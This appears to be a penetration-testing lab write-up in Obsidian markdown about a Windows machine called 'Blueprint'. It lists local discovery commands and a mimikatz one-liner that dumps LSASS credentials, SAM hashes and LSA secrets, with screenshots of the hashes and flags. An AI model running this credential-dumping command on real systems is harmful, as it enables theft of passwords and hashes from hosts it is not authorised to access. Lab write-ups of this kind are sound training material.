---
Topics:
  - "[[01 - Pentesting]]"
  - "[[01 - Red Team]]"
Types:
  - "[[02 - Write Ups]]"
tags:
  - writeup
date created: Thursday, July 18th 2024
date modified: Friday, July 19th 2024
---

# Blueprint Internal

## Objective

___

```ad-info
title:Objective 

- This note is used to keep track of the target Windows machine's discovery, privilege escalation, persistence and credential access processes
- This note also contains different cheatsheets and resources to aid in those methodologies
- Feel free to remove any sections that are non-applicable to keep this note compact.
```

___

## Internal Discovery Notes

> Run the commands yourself or let the script do it for you. Either way paste relevant screenshots here for future reference.

```ad-note
title: Situational Awareness Notes

*Current User Information*
~~~powershell
whoami /all
~~~
*Screenshot*
___
![[Pasted image 20240719010736.png]]
___
*Local Users*
~~~powershell
net user
~~~
*Screenshot*
___
![[Pasted image 20240719010755.png]]
___
*Local Groups*
~~~powershell
net localgroup
~~~
**Note**: Not working
*Screenshot*
___
![[Pasted image 20240719010840.png]]
___
*Current System*
~~~powershell
systeminfo
~~~
*Screenshot*
___
![[Pasted image 20240719010919.png]]
___
*Network Configuration*
~~~powershell
ipconfig
~~~
*NO NEW SUBNETS*
*Screenshot*
___
![[Pasted image 20240719011011.png]]
___
*Check Installed Software*
~~~powershell
get-childitem 'C:\Program Files\' | Select-Object Name | Format-Table
~~~

~~~powershell
dir "C:\Program Files\"
~~~
*Screenshot*
___
![[Pasted image 20240719011111.png]]
___
*Check Installed Software x86*
~~~powershell
get-childitem 'C:\Program Files (x86)\' | Select-Object Name | Format-Table
~~~
REDUNDANT COMMAND, THIS MACHINE IS x86 ONLY
*Screenshot*
___
![[Pasted image 20240719011226.png]]
___
*Root of C:/ Drive Contents*
~~~powershell
get-childitem 'C:\' | Select-Object Name | Format-Table
~~~
**Inetpub and XAMPP found.**
> Check non-default folders such as "Setup" or "Inetpub" for credentials.
*Screenshot*
___
![[Pasted image 20240719011257.png]]
___
```

## Credential Access (OS Credential Dumping)

> If you have obtained privileged access to the host, take a moment to dump credentials from LSASS using mimikatz.

~~~ad-note
title: Mimikatz LSASS Dump

*Mimikatz One-Liner*

```powershell
mimikatz.exe "privilege::debug" "log HOSTNAME.txt" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "token::elevate" "lsadump::sam" "lsadump::secrets"
```

![[Pasted image 20240719013912.png]]
~~~

**Hashes** (Lab user):

![[Pasted image 20240719013832.png]]

**Flags** (Admin desktop):

![[Pasted image 20240719013351.png]]
